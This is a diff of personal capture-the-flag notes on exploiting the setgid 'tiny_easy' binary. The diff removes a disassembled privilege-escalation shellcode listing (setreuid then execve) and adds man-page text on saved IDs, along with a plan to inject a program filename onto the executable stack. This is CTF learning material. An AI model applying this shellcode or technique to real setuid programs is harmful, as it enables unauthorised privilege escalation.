@@ -17,21 +17,27 @@ the 2nd item on the stack is the 'program_filename': can we change environment s
     -> note stack is rwx, but still randomized location on program load
 
 --- piece 1: shellcode
+(in sh.asm)
+man execve:
+    If the set-user-ID bit is set on the program file referred to by
+    pathname, then the effective user ID of the calling process is
+    changed to that of the owner of the program file.  Similarly, if
+    the set-group-ID bit is set on the program file, then the
+    effective group ID of the calling process is set to the group of
+    the program file.
+    
+    The effective user ID of the process is copied to the saved set-
+    user-ID; similarly, the effective group ID is copied to the saved
+    set-group-ID.  This copying takes place after any effective ID
+    changes that occur because of the set-user-ID and set-group-ID
+    mode bits.
+    
+    The process's real UID and real GID, as well as its supplementary
+    group IDs, are unchanged by a call to execve().
 
-shellcode: setreuid(getegid(), getegid()); execve(argv[0], NULL, NULL);
-
-   0:   6a 32                   push   0x32
-   2:   58                      pop    rax          ; getegid, no mov (requires null byte)
-   3:   0f 05                   syscall
-   5:   89 c3                   mov    ebx,eax      ; setreuid arg1
-   7:   89 c1                   mov    ecx,eax      ; setreuid arg0
-   9:   6a 46                   push   0x46         ; setreuid, no mov (requires null byte)
-   b:   58                      pop    rax
-   c:   0f 05                   syscall
-   e:   8d 1c 24                lea    ebx,[rsp]    ; execve arg0 (pointer to argv[0])
-  11:   31 c9                   xor    ecx,ecx      ; execve arg1
-  13:   31 d2                   xor    edx,edx      ; execve arg2
-  15:   0f 05                   syscall
+since we're execve'ing into tiny_easy, our real/effective IDs are just tiny_easy
+    -> saved gid should be tiny_easy_pwn
+    -> getresgid() -> setreuid()
 
 --- piece 2: inject custom "program_filename" onto stack
 running with a custom environment: env -i TEST="TEST" bash -l -c "gdb tiny_easy"
